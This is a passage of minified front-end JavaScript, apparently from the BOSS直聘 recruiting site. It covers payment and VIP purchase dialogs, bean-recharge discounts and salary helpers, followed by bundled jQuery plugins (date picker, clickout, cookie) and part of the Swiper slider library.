                var o = a[t.hotJobType][t.action] + t.priceId;
                _T.sendEvent(o)
            } catch (e) {}
            function s(e) {
                d(c, r, i),
                "function" == typeof i.success && i.success(e)
            }
            var o = i.item.type || "ordinary"
              , r = Utemplate(n[o][t.action], i.item)
              , n = {
                ordinary: {
                    1: "火爆职位-普通版",
                    2: "",
                    3: "火爆职位-普通版",
                    4: "火爆职位-普通版"
                },
                carefree: {
                    1: "火爆职位-畅聊版",
                    2: "",
                    3: "火爆职位-畅聊版",
                    4: "火爆职位-畅聊版"
                },
                experience: {
                    1: "火爆职位",
                    2: "",
                    3: "",
                    4: "",
                    5: "火爆职位"
                }
            }[o][t.action]
              , c = i.action ? i.action + "成功" : "发布成功"
              , o = ((i.item.combos && i.item.combos.activityType || i.item.activityType) && (r += '<ul class="vip-promotion-2018-notice"><li>1.活动截止时间2019年1月1日,超出活动时间范围，购买的商品不再享受活动折扣</li><li>2.本次优惠活动仅针对部分用户,最终解释权归BOSS直聘所有</li><li>3.活动期间购买的商品原则上无法申请退款,如因平台原因导致您无法使用账号的赠送时长请联系客服</li></ul>'),
            {
                url: e,
                data: t,
                description: n,
                amount: i.item.pay,
                success: s
            });
            Payment.purchase(o, {
                success: function(e) {
                    t.hotJobType && t.action && e.ptype && window.top.__conversion(a[t.hotJobType][t.action] + {
                        1: "bean",
                        2: "wx",
                        3: "zfb"
                    }[e.ptype] + "_" + t.priceId),
                    s(e)
                }
            })
        },
        commercial: function(e, i) {
            function t(e) {
                var t = function() {};
                return i.success ? t = i.success : i.confirm && (t = i.confirm),
                1 === e.experience ? (d("免费试用火爆职位", e.dialog.content, {
                    confirm: t
                }),
                !0) : e.bzbParam ? ($.get("/wapi/zpblock/order/bzbquery", {
                    bzbParam: e.bzbParam
                }).success(function(e) {
                    d(e.zpData.dialog.title, e.zpData.dialog.content, {
                        confirm: t
                    })
                }),
                !0) : (e = "",
                3 == r && s.activityType && (e = '<ul class="vip-promotion-2018-notice"><li>特别注意：</li><li>1. 活动期间，每个用户只能购买一次VIP账号，不可多次购买；</li><li>2. 活动期间购买的商品原则上无法申请退款，如因平台原因导致您无法使用账号的赠送时长请联系客服；</li></ul>'),
                2 == r && s.activityType && (e = '<ul class="vip-promotion-2018-notice"><li>特别注意：</li><li>1. 活动截止时间1月1日,超出活动时间范围，购买的商品不再享受活动折扣；</li><li>2. 本次优惠活动仅针对部分用户,最终解释权归BOSS直聘所有；</li><li>3. 活动期间购买的商品原则上无法申请退款如因平台原因导致您无法使用账号的赠送时长请联系客服；</li></ul>'),
                void d(c, l + e, {
                    confirm: t
                }))
            }
            var n = 11 == i.item.business ? "普通职位" : "火爆职位"
              , a = ""
              , o = (i.item && i.item.categoryList && i.item.categoryList.filter(function(e) {
                return e.name && -1 < e.name.indexOf("道具购买折扣")
            }).length && (a = "（VIP道具专享价目前只支持6.12以上版本和网页版使用，暂不支持iOS）"),
            {
                1: "免费试用火爆职位",
                2: n + "-<%this.priceName%>",
                3: "升级VIP账号",
                4: "购买" + i.item.title,
                5: "升级VIP账号",
                6: n + "-<%this.priceName%>",
                7: "",
                8: "",
                9: "免费试用火爆职位",
                10: n + "-<%this.priceName%>",
                11: "升级VIP账号",
                12: "购买<%this.title%>",
                16: "升级VIP账号"
            })
              , n = {
                1: "火爆职位发布成功！该职位可<%this.title%>，为避免影响招聘，请及时延长招聘时长。",
                2: n + "<%this.priceName%>发布成功！可保持职位在线一个月，期间可<%this.descList[1].bottomDesc%>牛人<%this.descList[1].count%><%this.descList[1].unitDesc%>，<%this.descList[0].bottomDesc%><%this.descList[0].count%><%this.descList[0].unitDesc%>。",
                3: "您已成功购买VIP账号，可在VIP权益页面查看使用明细" + a,
                4: "您已成功购买「<%this.title%>」，<%if(this.business != 16){%><%this.inDate%>内，<%}%>主动沟通人数<%this.chat%>，赠送主动查看人数<%this.view%>。",
                5: "您已成功购买VIP账号，可在VIP权益页面查看使用明细" + a,
                6: n + "<%this.priceName%>发布成功！可保持职位在线<%this.expireName%>，期间可<%this.descList[1].bottomDesc%>牛人<%this.descList[1].count%><%this.descList[1].unitDesc%>，<%this.descList[0].bottomDesc%><%this.descList[0].count%><%this.descList[0].unitDesc%>。",
                7: "",
                8: "",
                9: "",
                10: n + "<%this.priceName%>发布成功！可保持职位在线<%this.expireName%>，期间可<%this.descList[1].bottomDesc%>牛人<%this.descList[1].count%><%this.descList[1].unitDesc%>，<%this.descList[0].bottomDesc%><%this.descList[0].count%><%this.descList[0].unitDesc%>。",
                11: "您已成功购买VIP账号，可在VIP权益页面查看使用明细" + a,
                12: "",
                16: "您已成功购买VIP账号，可在VIP权益页面查看使用明细" + a
            }
              , s = (4 == i.item.cardId && (i.title = i.item.title,
            i.item.chat = i.item.chatDescList[0],
            i.item.inDate = 2 < i.item.chatDescList.length ? i.item.chatDescList[1] : "",
            i.item.view = "+" + 2 * parseInt(i.item.chat, 10) + "次"),
            i.item || i)
              , r = s.cardId
              , c = o[r] ? Utemplate(o[r], s) : ""
              , l = 9 == r ? (a = s).categoryList ? a.categoryList.map(function(e) {
                return e.bottomDesc + e.count + e.unitDesc
            }).join("，") : "" : n[r] ? Utemplate(n[r], s) : ""
              , o = {
                url: "/boss/block/pay.json",
                data: e,
                tid: s.p || "",
                description: c,
                amount: parseInt(s.beanCount, 10),
                success: t
            }
              , a = (i.item.article && (o.article = i.item.article),
            {
                buy: function(e) {
                    e = {
                        action: "confirm-payment",
                        p: "",
                        p2: s.beanCount,
                        p3: e.balance,
                        p4: e.pay,
                        p5: e.pay
                    };
                    Block.action(e)
                },
                success: t
            });
            Payment.purchase(o, a)
        }
    }
}()
  , Recharge = function() {
    var e = {
        get: {}
    };
    e.get.discount = function() {
        var t = $.Deferred();
        return $.get("/boss/item/recharge/discount/check.json", function(e) {
            1 == e.rescode ? t.resolve(e) : $.toast({
                type: "error",
                content: e.message
            })
        }),
        t
    }
    ;
    function o(e, t) {
        if (!e)
            return {
                amount: 0,
                save: 0,
                pay: 0
            };
        var i = 100 * e
          , t = Math.floor(i * t);
        return {
            amount: e,
            save: (i - t) / 100,
            pay: t / 100
        }
    }
    var t = function(e) {
        return Utemplate('<p class="gray ios-off">ios用户独享充值折扣（仅限网页版）</p><div><p class="pull-left">直豆充值</p><div class="recharge-rebate-panel"><ul><%for(var i=0; i<this.list.length; i++){%><li ka="selected_amount_<%this.list[i].amount%>" <%if(this.list[i].amount==500){%> class="selected"<%}%> data-amount="<%this.list[i].amount%>"><p class="rebate-item"><%this.list[i].amount%>直豆<span class="rebate-off">减<%this.list[i].save%>元</span><span class="interval"></span></p></li><%}%></ul><input class="ipt ipt-amount" maxlength="4" placeholder="输入任意直豆数"></div></div>', {
            list: e
        })
    }
      , a = function(e) {
        return Utemplate('<ul><li><span class="pull-left">充值直豆个数</span><p><input type="text" value="100" maxlength="4" class="ipt-amount"></p></li><%if(this.discount){%><li><span class="pull-left">iOS用户9折优惠</span><p class="order-save"></p></li><%}%><li><span class="pull-left">金额</span><p  class="order-pay"></p></li><li><p class="ios-notice">因iOS政策限制，直豆在iOS端V6.17以上版本仅可用于道具购买。<br>安卓及PC端不受影响。</p></li></ul>', e)
    };
    function s(t) {
        var e = {
            recharge: !0,
            url: t.url || "/boss/item/rechargebean.json",
            amount: 100 * t.amount,
            pay: 100 * t.pay,
            description: "直豆充值：" + t.amount + "个",
            data: {
                beanCount: t.amount
            }
        };
        Payment.purchase(e, {
            success: function(e) {
                t.save ? Payment.success({
                    article: "直豆充值成功",
                    text: "本次充值为您节省了" + t.save + "元"
                }) : Payment.success({
                    article: "直豆充值成功",
                    text: "你可以在 BOSS直聘 APP「钱包」中查看充值明细"
                }),
                "function" == t.callback && t.callback({
                    pay: t.pay,
                    save: t.save,
                    amount: t.amount
                })
            }
        })
    }
    function n(n) {
        function i(e) {
            var e = $(".recharge-beans-rebate .selected").length ? parseInt($(".recharge-beans-rebate .selected").attr("data-amount"), 10) : $(".recharge-beans-rebate .ipt").val();
            $(".recharge-beans-rebate .order-info").remove(),
            0 < e ? ($(".recharge-beans-rebate .btn-sure").removeClass("disabled"),
            e = '<div class="order-info">支付金额<span class="order-amount">￥' + (e = o(e, a(e))).pay + '</span><span class="gray">(已减' + e.save + "元）</span></div>",
            $(e).insertBefore($(".recharge-beans-rebate .btns"))) : $(".recharge-beans-rebate .btn-sure").addClass("disabled")
        }
        var a = function(e) {
            var t, i = 0;
            for (t in n.discountInfo.rangeDiscount)
                parseInt(t, 10) <= e && (i = n.discountInfo.rangeDiscount[t]);
            return i
        };
        $.dialog({
            title: "直豆充值",
            content: t([100, 200, 300, 500, 1e3].map(function(e) {
                return {
                    amount: e,
                    save: o(e, a(e)).save
                }
            })),
            confirmText: "确定充值",
            cancelText: !1,
            wrapClass: "recharge-beans-rebate",
            onOpen: function(t) {
                $(t).on("input", ".ipt-amount", function() {
                    var e = $(this).val().replace(/\D+/g, "");
                    e.length && (e = parseInt($(this).val(), 10)),
                    $(this).val(e),
                    $(t).find(".recharge-rebate-panel .selected").removeClass("selected"),
                    i()
                }),
                $(t).on("click", ".recharge-rebate-panel li", function() {
                    $(t).find(".recharge-rebate-panel .selected").removeClass("selected"),
                    $(this).addClass("selected"),
                    i()
                }),
                i()
            },
            onConfirm: function(e) {
                if ($(e).find(".btn-sure").hasClass("disabled"))
                    return !1;
                var t = $(".recharge-beans-rebate .selected").length ? parseInt($(".recharge-beans-rebate .selected").attr("data-amount"), 10) : $(".recharge-beans-rebate .ipt").val();
                s($.extend({
                    url: n.url,
                    callback: n.success,
                    confirm: n.success
                }, o(t, a(t)))),
                $(e).remove()
            }
        })
    }
    function r(i) {
        var n = i.discount ? .9 : 1;
        $.dialog({
            title: "直豆充值",
            content: a(i),
            confirmText: "确定充值",
            cancelText: !1,
            wrapClass: "recharge-beans-original",
            onOpen: function(i) {
                function t(e) {
                    var e = parseInt(e, 10)
                      , t = o(e, n);
                    $(i).find(".order-save").text("-￥" + t.save),
                    $(i).find(".order-pay").text("￥" + t.pay),
                    e ? $(i).find(".btn-sure").removeClass("disabled") : $(i).find(".btn-sure").addClass("disabled")
                }
                $(i).on("input", ".ipt-amount", function() {
                    var e = $(this).val().replace(/\D+/g, "");
                    e.length && (e = parseInt($(this).val(), 10)),
                    $(this).val(e),
                    t(e)
                }),
                t(100)
            },
            onConfirm: function(e) {
                if ($(e).find(".btn-sure").hasClass("disabled"))
                    return !1;
                var t = $(e).find(".ipt-amount").val();
                s($.extend({
                    callback: i.success,
                    url: i.url
                }, o(t, n))),
                $(e).remove()
            }
        })
    }
    return function(i) {
        e.get.discount().then(function(e) {
            var t = $.extend(i || {}, e);
            return (e.discountInfo && e.discountInfo.rangeDiscount && !isEmpty(e.discountInfo.rangeDiscount) ? n : r)(t)
        })
    }
}()
  , __conversion = __conversion || function(e) {
    try {
        _T.sendEvent(e)
    } catch (e) {}
}
  , Salary = function() {
    var o = {};
    return o.number = function(e) {
        var i = this;
        if (!(this instanceof o.number))
            return new o.number(e);
        i.number = e,
        this.between = function(e, t) {
            return e <= i.number && i.number <= t
        }
    }
    ,
    o.unit = function(e) {
        var t = o.number(e);
        return t.between(1, 29) ? 1 : t.between(30, 99) ? 5 : 100 <= e ? 10 : 1
    }
    ,
    o.max = function(e) {
        return e <= 10 ? e + 5 : e <= 30 ? 2 * e : e <= 99 ? Math.min(120, e + 30) : Math.min(260, 2 * e)
    }
    ,
    {
        min: function() {
            var e = 250
              , t = 1
              , i = [];
            for (o.unit(t); t <= e; )
                i.push(t),
                t += o.unit(t);
            return i
        },
        max: function(e) {
            var t = o.max(e)
              , i = o.unit(e)
              , n = Math.floor(e / i) * i
              , a = [];
            for (o.unit(n); n < t; )
                (n += o.unit(n)) <= t && a.push(n);
            return a
        }
    }
}()
  , Auxiliary = {
    getByteLength: function(e) {
        for (var t, i = 0, n = e.length, a = 0; a < n; a++)
            i += 0 <= (t = e.charCodeAt(a)) && t <= 128 ? 1 : 2;
        return i
    },
    getHybridLength: function(e) {
        var t = 0;
        len = (e = e).length,
        charCode = -1;
        for (var i = 0; i < len; i++)
            0 <= (charCode = e.charCodeAt(i)) && charCode <= 128 ? t += .5 : t += 1;
        return Math.round(t)
    }
}
  , Swiper = (!function(o) {
    "use strict";
    function n(e, t) {
        this.$body = o(document.body),
        this.$element = o(e),
        this.page = 1,
        this.isShowBefore = "false" !== this.$element.attr("isShowBefore"),
        this.isShowNow = "false" !== this.$element.attr("isShowNow"),
        this.isNoWorkExp = "true" === this.$element.attr("isNoWorkExp"),
        this.isShowToday = "false" !== this.$element.attr("isShowToday"),
        this.order = this.$element.attr("order") || "desc",
        this.init()
    }
    n.prototype.init = function() {
        var t;
        this.$element.hasClass("disabled") || ((t = this).dates = this.date(),
        t.render(),
        t.$wrap.on("click", ".year", function() {
            t.selectYear(o(this))
        }),
        t.$wrap.on("click", ".month", function() {
            t.selectMonth(o(this))
        }),
        t.$wrap.on("click", ".prev", function(e) {
            t.prev(),
            e.stopPropagation()
        }),
        t.$wrap.on("click", ".next", function(e) {
            t.next(),
            e.stopPropagation()
        }),
        this.$element.on("click", function() {
            t.$wrap.is(":visible") ? t.hide() : t.show()
        }),
        o(document).on("click.workStart", function(e) {
            !t.$wrap.is(":visible") || t.$wrap[0].contains(e.target) || t.$element[0].contains(e.target) || t.hide()
        }))
    }
    ,
    n.prototype.getFill = function() {
        var e = (this.$element.attr("data-fill") ? o("input[name=" + this.$element.attr("data-fill") + "]") : this.$element).val().split("-");
        return {
            year: e.length ? e[0] : "",
            month: 1 < e.length ? e[1] : ""
        }
    }
    ,
    n.prototype.render = function() {
        this.$wrap = o('<div class="workstartpicker-wrap"><div class="year-wrap"></div><div class="month-wrap"></div></div>');
        var e = this.template();
        this.$wrap.find(".year-wrap").html(e),
        o("body").append(this.$wrap)
    }
    ,
    n.prototype.date = function() {
        var e = parseInt(this.$element.attr("data-min"), 10)
          , t = parseInt(this.$element.attr("data-max"), 10)
          , i = [];
        if (this.isShowBefore && i.push({
            name: e + "前",
            value: e - 1
        }),
        "desc" === this.order)
            for (var n = e; n <= t; n++)
                i.push({
                    name: n,
                    value: n,
                    hasChild: !0
                });
        else
            for (n = e; n <= t; n++)
                i.unshift({
                    name: n,
                    value: n,
                    hasChild: !0
                });
        return this.isShowNow && i.push({
            name: "应届生",
            value: 0
        }),
        this.isNoWorkExp && i.push({
            name: "无工作经验",
            value: 0
        }),
        i.reverse(),
        i
    }
    ,
    n.prototype.template = function() {
        for (var e = 12 * (this.page - 1), t = 12 * this.page, i = this.dates.slice(e, t), e = "desc" === this.order ? i[i.length - 1].name + " - " + i[0].name : i[0].name + " - " + i[i.length - 1].name, n = this.getFill().year, a = '<div class="title"><i class="prev"></i><i class="next"></i><p class="text">' + e + '</p></div><div class="content"><ul>', o = 0; o < i.length; o++)
            a += '<li class="year ' + (n == i[o].value ? "selected" : "") + '" data-val="' + i[o].value + '">' + i[o].name + "</li>";
        return a += "</ul></div>"
    }
    ,
    n.prototype.month = function(e) {
        for (var t = ["一月", "二月", "三月", "四月", "五月", "六月", "七月", "八月", "九月", "十月", "十一月", "十二月"], i = '<div class="title"><p class="text">' + e + '</p></div><div class="content"><ul>', n = this.getFill(), a = 0; a < 12; a++)
            i += '<li class="month ' + (n.year == e && parseInt(n.month, 10) == a + 1 ? "selected" : "") + '">' + t[a] + "</li>";
        return i += "</ul></div>"
    }
    ,
    n.prototype.prev = function() {
        var e;
        1 < this.page && (this.page--,
        e = this.template(),
        this.$wrap.find(".year-wrap").html(e))
    }
    ,
    n.prototype.next = function() {
        var e = Math.ceil(this.dates.length / 12);
        this.page < e && (this.page++,
        e = this.template(),
        this.$wrap.find(".year-wrap").html(e))
    }
    ,
    n.prototype.selectMonth = function(e) {
        var t = this.$wrap.find(".month-wrap .text").text()
          , e = 9 <= e.index() ? e.index() + 1 : "0" + (e.index() + 1);
        this.fill(t, e)
    }
    ,
    n.prototype.selectYear = function(e) {
        var t = e.attr("data-val")
          , e = this.dates.filter(function(e) {
            return e.value == t
        });
        e[0] && e[0].hasChild ? (e = this.month(t),
        this.$wrap.find(".month-wrap").html(e),
        this.$wrap.addClass("month-panel")) : this.fill(t)
    }
    ,
    n.prototype.fill = function(t, e) {
        var i = (t = this.dates.filter(function(e) {
            return e.value == t
        })[0]).value
          , n = t.name
          , a = this.$element.attr("data-fill")
          , a = o("input[name=" + a + "]");
        e && (i += "-" + e,
        n += "-" + e),
        this.$element.val(n),
        a && a.val(i),
        this.hide()
    }
    ,
    n.prototype.show = function() {
        var e = this.$element.offset()
          , e = (this.$wrap.css({
            left: e.left + "px",
            top: this.$element.outerHeight() + e.top + "px"
        }),
        this.getFill());
        this.$wrap.find(".selected").removeClass("selected"),
        "" !== e.year && this.$wrap.find(".year-wrap li[data-val=" + e.year + "]").addClass("selected"),
        this.$wrap.show()
    }
    ,
    n.prototype.hide = function() {
        this.$wrap.hide(),
        this.$wrap.removeClass("month-panel")
    }
    ;
    var e = o.fn.workstartpicker;
    o.fn.workstartpicker = function(i) {
        return this.each(function() {
            var e = o(this)
              , t = e.data("boss.date");
            t || e.data("boss.date", t = new n(this)),
            "string" == typeof i && t[i].call(e)
        })
    }
    ,
    o.fn.workstartpicker.Constructor = n,
    o.fn.workstartpicker.noConflict = function() {
        return o.fn.chosen = e,
        this
    }
}(jQuery),
!function(e, t) {
    var i = "function" == typeof require ? require : function(e) {
        return {
            jquery: jQuery
        }[e]
    }
    ;
    "object" == typeof exports && "undefined" != typeof module ? module.exports = t(i) : "function" == typeof define && define.amd ? define(["jquery"], t.bind(e, i)) : e.jQueryClickout = t(i)
}(this, function(l, e, t, i) {
    return function n(a, o, s) {
        function r(i, e) {
            if (!o[i]) {
                if (!a[i]) {
                    var t = "function" == typeof l && l;
                    if (!e && t)
                        return t(i, !0);
                    if (c)
                        return c(i, !0);
                    e = new Error("Cannot find module '" + i + "'");
                    throw e.code = "MODULE_NOT_FOUND",
                    e
                }
                t = o[i] = {
                    exports: {}
                };
                a[i][0].call(t.exports, function(e) {
                    var t = a[i][1][e];
                    return r(t || e)
                }, t, t.exports, n, a, o, s)
            }
            return o[i].exports
        }
        for (var c = "function" == typeof l && l, e = 0; e < s.length; e++)
            r(s[e]);
        return r
    }({
        1: [function(e, t, i) {
            var a = e("jquery")
              , n = a(document)
              , o = {}
              , s = !1;
            a.event.special.clickout = {
                setup: function(e, t, i) {
                    s || (n.on("click.clickout-handler", function(n) {
                        a.each(o, function(e, t) {
                            var i = !0;
                            a.each(t.elements, function(e, t) {
                                a(n.target).closest(t).length && (i = !1)
                            }),
                            i && t.handler.call(a(t.elements), n)
                        })
                    }),
                    s = !0)
                },
                teardown: function() {
                    o || (n.off("click.clickout-handler"),
                    s = !1)
                },
                add: function(e) {
                    var t = e.guid;
                    o.hasOwnProperty(t) ? o[t].elements.push(this) : o[t] = {
                        elements: [this],
                        handler: e.handler
                    }
                },
                remove: function(e) {
                    delete o[e.guid]
                }
            }
        }
        , {
            jquery: "jquery"
        }]
    }, {}, [1])(1)
}),
!function(e) {
    "function" == typeof define && define.amd ? define(["jquery"], e) : "object" == typeof exports ? e(require("jquery")) : e(jQuery)
}(function(p) {
    function u(e) {
        return f.raw ? e : encodeURIComponent(e)
    }
    function h(e, t) {
        e = f.raw ? e : function(e) {
            0 === e.indexOf('"') && (e = e.slice(1, -1).replace(/\\"/g, '"').replace(/\\\\/g, "\\"));
            try {
                return e = decodeURIComponent(e.replace(i, " ")),
                f.json ? JSON.parse(e) : e
            } catch (e) {}
        }(e);
        return p.isFunction(t) ? t(e) : e
    }
    var i = /\+/g
      , f = p.cookie = function(e, t, i) {
        var n, a;
        if (void 0 !== t && !p.isFunction(t))
            return "number" == typeof (i = p.extend({}, f.defaults, i)).expires && (n = i.expires,
            (a = i.expires = new Date).setTime(+a + 864e5 * n)),
            document.cookie = [u(e), "=", (a = t,
            u(f.json ? JSON.stringify(a) : String(a))), i.expires ? "; expires=" + i.expires.toUTCString() : "", i.path ? "; path=" + i.path : "", i.domain ? "; domain=" + i.domain : "", i.secure ? "; secure" : ""].join("");
        for (var o = e ? void 0 : {}, s = document.cookie ? document.cookie.split("; ") : [], r = 0, c = s.length; r < c; r++) {
            var l = s[r].split("=")
              , d = (d = l.shift(),
            f.raw ? d : decodeURIComponent(d))
              , l = l.join("=");
            if (e && e === d) {
                o = h(l, t);
                break
            }
            e || void 0 === (l = h(l)) || (o[d] = l)
        }
        return o
    }
    ;
    f.defaults = {},
    p.removeCookie = function(e, t) {
        return void 0 !== p.cookie(e) && (p.cookie(e, "", p.extend({}, t, {
            expires: -1
        })),
        !p.cookie(e))
    }
}),
function(e, b) {
    "use strict";
    function r(e, t) {
        return document.querySelectorAll ? (t || document).querySelectorAll(e) : jQuery(e, t)
    }
    function m() {
        var e = x - k;
        return b.freeMode && (e = x - k),
        e = (e = b.slidesPerView > y.slides.length && !b.centeredSlides ? 0 : e) < 0 ? 0 : e
    }
    function P() {
        var e, t, i, n = y.h.addEventListener, a = "wrapper" === b.eventTarget ? y.wrapper : y.container;
        if (y.browser.ie10 || y.browser.ie11 ? (n(a, y.touchEvents.touchStart, l),
        n(document, y.touchEvents.touchMove, d),
        n(document, y.touchEvents.touchEnd, p)) : (y.support.touch && (n(a, "touchstart", l),
        n(a, "touchmove", d),
        n(a, "touchend", p)),
        b.simulateTouch && (n(a, "mousedown", l),
        n(document, "mousemove", d),
        n(document, "mouseup", p))),
        b.autoResize && n(window, "resize", y.resizeFix),
        A(),
        y._wheelEvent = !1,
        b.mousewheelControl) {
            if (void 0 !== document.onmousewheel && (y._wheelEvent = "mousewheel"),
            !y._wheelEvent)
                try {
                    new WheelEvent("wheel"),
                    y._wheelEvent = "wheel"
                } catch (e) {}
            y._wheelEvent || (y._wheelEvent = "DOMMouseScroll"),
            y._wheelEvent && n(y.container, y._wheelEvent, c)
        }
        if (b.keyboardControl && n(document, "keydown", s),
        b.updateOnImagesReady) {
            y.imagesToLoad = r("img", y.container);
            for (var o = 0; o < y.imagesToLoad.length; o++)
                e = y.imagesToLoad[o],
                i = void 0,
                t = function() {
                    null != y && (void 0 !== y.imagesLoaded && y.imagesLoaded++,
                    y.imagesLoaded === y.imagesToLoad.length && (y.reInit(),
                    b.onImagesReady && y.fireCallback(b.onImagesReady, y)))
                }
                ,
                e.complete ? t() : (e = e.currentSrc || e.getAttribute("src")) ? ((i = new Image).onload = t,
                i.onerror = t,
                i.src = e) : t()
        }
    }
    function A() {
        var e = y.h.addEventListener;
        if (b.preventLinks)
            for (var t = r("a", y.container), i = 0; i < t.length; i++)
                e(t[i], "click", G);
        if (b.releaseFormElements) {
            var n = r("input, textarea, select", y.container);
            for (i = 0; i < n.length; i++)
                e(n[i], y.touchEvents.touchStart, a, !0),
                y.support.touch && b.simulateTouch && e(n[i], "mousedown", a, !0)
        }
        if (b.onSlideClick)
            for (i = 0; i < y.slides.length; i++)
                e(y.slides[i], "click", M);
        if (b.onSlideTouch)
            for (i = 0; i < y.slides.length; i++)
                e(y.slides[i], y.touchEvents.touchStart, B)
    }
    function U() {
        var e = y.h.removeEventListener;
        if (b.onSlideClick)
            for (i = 0; i < y.slides.length; i++)
                e(y.slides[i], "click", M);
        if (b.onSlideTouch)
            for (i = 0; i < y.slides.length; i++)
                e(y.slides[i], y.touchEvents.touchStart, B);
        if (b.releaseFormElements)
            for (var t = r("input, textarea, select", y.container), i = 0; i < t.length; i++)
                e(t[i], y.touchEvents.touchStart, a, !0),
                y.support.touch && b.simulateTouch && e(t[i], "mousedown", a, !0);
        if (b.preventLinks) {
            var n = r("a", y.container);
            for (i = 0; i < n.length; i++)
                e(n[i], "click", G)
        }
    }
    function s(e) {
        var t = e.keyCode || e.charCode;
        if (!(e.shiftKey || e.altKey || e.ctrlKey || e.metaKey)) {
            if (37 === t || 39 === t || 38 === t || 40 === t) {
                for (var i = !1, n = y.h.getOffset(y.container), a = y.h.windowScroll().left, o = y.h.windowScroll().top, s = y.h.windowWidth(), r = y.h.windowHeight(), c = [[n.left, n.top], [n.left + y.width, n.top], [n.left, n.top + y.height], [n.left + y.width, n.top + y.height]], l = 0; l < c.length; l++) {
                    var d = c[l];
                    d[0] >= a && d[0] <= a + s && d[1] >= o && d[1] <= o + r && (i = !0)
                }
                if (!i)
                    return
            }
            C ? (37 !== t && 39 !== t || (e.preventDefault ? e.preventDefault() : e.returnValue = !1),
            39 === t && y.swipeNext(),
            37 === t && y.swipePrev()) : (38 !== t && 40 !== t || (e.preventDefault ? e.preventDefault() : e.returnValue = !1),
            40 === t && y.swipeNext(),
            38 === t && y.swipePrev())
        }
    }
    function c(e) {
        var t = y._wheelEvent
          , i = 0;
        if (e.detail)
            i = -e.detail;
        else if ("mousewheel" === t)
            if (b.mousewheelControlForceToAxis)
                if (C) {
                    if (!(Math.abs(e.wheelDeltaX) > Math.abs(e.wheelDeltaY)))
                        return;
                    i = e.wheelDeltaX
                } else {
                    if (!(Math.abs(e.wheelDeltaY) > Math.abs(e.wheelDeltaX)))
                        return;
                    i = e.wheelDeltaY
                }
            else
                i = e.wheelDelta;
        else if ("DOMMouseScroll" === t)
            i = -e.detail;
        else if ("wheel" === t)
            if (b.mousewheelControlForceToAxis)
                if (C) {
                    if (!(Math.abs(e.deltaX) > Math.abs(e.deltaY)))
                        return;
                    i = -e.deltaX
                } else {
                    if (!(Math.abs(e.deltaY) > Math.abs(e.deltaX)))
                        return;
                    i = -e.deltaY
                }
            else
                i = Math.abs(e.deltaX) > Math.abs(e.deltaY) ? -e.deltaX : -e.deltaY;
        if (b.freeMode) {
            t = y.getWrapperTranslate() + i;
            if ((t = 0 < t ? 0 : t) < -m() && (t = -m()),
            y.setWrapperTransition(0),
            y.setWrapperTranslate(t),
            y.updateActiveSlide(t),
            0 === t || t === -m())
                return
        } else
            60 < (new Date).getTime() - J && (i < 0 ? y.swipeNext() : y.swipePrev()),
            J = (new Date).getTime();
        return b.autoplay && y.stopAutoplay(!0),
        e.preventDefault ? e.preventDefault() : e.returnValue = !1,
        !1
    }
    function M(e) {
        y.allowSlideClick && (N(e),
        y.fireCallback(b.onSlideClick, y, e))
    }
    function B(e) {
        N(e),
        y.fireCallback(b.onSlideTouch, y, e)
    }
    function N(e) {
        if (e.currentTarget)
            y.clickedSlide = e.currentTarget;
        else {
            for (var t = e.srcElement; !(-1 < t.className.indexOf(b.slideClass)) && (t = t.parentNode); )
                ;
            y.clickedSlide = t
        }
        y.clickedSlideIndex = y.slides.indexOf(y.clickedSlide),
        y.clickedSlideLoopIndex = y.clickedSlideIndex - (y.loopedSlides || 0)
    }
    function G(e) {
        return y.allowLinks ? void 0 : (e.preventDefault ? e.preventDefault() : e.returnValue = !1,
        b.preventLinksPropagation && "stopPropagation"in e && e.stopPropagation(),
        !1)
    }
    function a(e) {
        return e.stopPropagation ? e.stopPropagation() : e.returnValue = !1,
        !1
    }
    function l(e) {
        if (b.preventLinks && (y.allowLinks = !0),
        y.isTouched || b.onlyExternal)
            return !1;
        var t = e.target || e.srcElement
          , i = (document.activeElement && document.activeElement !== document.body && document.activeElement !== t && document.activeElement.blur(),
        "input select textarea".split(" "));
        return !(b.noSwiping && t && function(e) {
            var t = !1;
            for (; n(e, b.noSwipingClass) && (t = !0),
            e = e.parentElement,
            !t && e.parentElement && !n(e, b.wrapperClass); )
                ;
            return t = !(t || !n(e, b.wrapperClass) || !n(e, b.noSwipingClass)) || t
        }(t)) && (R = !1,
        y.isTouched = !0,
        !(O = "touchstart" === e.type) && "which"in e && 3 === e.which ? y.isTouched = !1 : void (O && 1 !== e.targetTouches.length || (y.callPlugins("onTouchStartBegin"),
        !O && !y.isAndroid && i.indexOf(t.tagName.toLowerCase()) < 0 && (e.preventDefault ? e.preventDefault() : e.returnValue = !1),
        i = O ? e.targetTouches[0].pageX : e.pageX || e.clientX,
        t = O ? e.targetTouches[0].pageY : e.pageY || e.clientY,
        y.touches.startX = y.touches.currentX = i,
        y.touches.startY = y.touches.currentY = t,
        y.touches.start = y.touches.current = C ? i : t,
        y.setWrapperTransition(0),
        y.positions.start = y.positions.current = y.getWrapperTranslate(),
        y.setWrapperTranslate(y.positions.start),
        y.times.start = (new Date).getTime(),
        v = void 0,
        0 < b.moveStartThreshold && (E = !1),
        b.onTouchStart && y.fireCallback(b.onTouchStart, y, e),
        y.callPlugins("onTouchStartEnd"))))
    }
    function d(e) {
        if (y.isTouched && !b.onlyExternal && (!O || "mousemove" !== e.type)) {
            var t, i = O ? e.targetTouches[0].pageX : e.pageX || e.clientX, n = O ? e.targetTouches[0].pageY : e.pageY || e.clientY;
            if (v = void 0 !== (v = void 0 === v && C ? !!(v || Math.abs(n - y.touches.startY) > Math.abs(i - y.touches.startX)) : v) || C ? v : !!(v || Math.abs(n - y.touches.startY) < Math.abs(i - y.touches.startX)))
                y.isTouched = !1;
            else {
                if (C) {
                    if (!b.swipeToNext && i < y.touches.startX || !b.swipeToPrev && i > y.touches.startX)
                        return
                } else if (!b.swipeToNext && n < y.touches.startY || !b.swipeToPrev && n > y.touches.startY)
                    return;
                if (e.assignedToSwiper)
                    y.isTouched = !1;
                else if (e.assignedToSwiper = !0,
                b.preventLinks && (y.allowLinks = !1),
                b.onSlideClick && (y.allowSlideClick = !1),
                b.autoplay && y.stopAutoplay(!0),
                !O || 1 === e.touches.length)
                    if (y.isMoved || (y.callPlugins("onTouchMoveStart"),
                    b.loop && (y.fixLoop(),
                    y.positions.start = y.getWrapperTranslate()),
                    b.onTouchMoveStart && y.fireCallback(b.onTouchMoveStart, y)),
                    y.isMoved = !0,
                    e.preventDefault ? e.preventDefault() : e.returnValue = !1,
                    y.touches.current = C ? i : n,
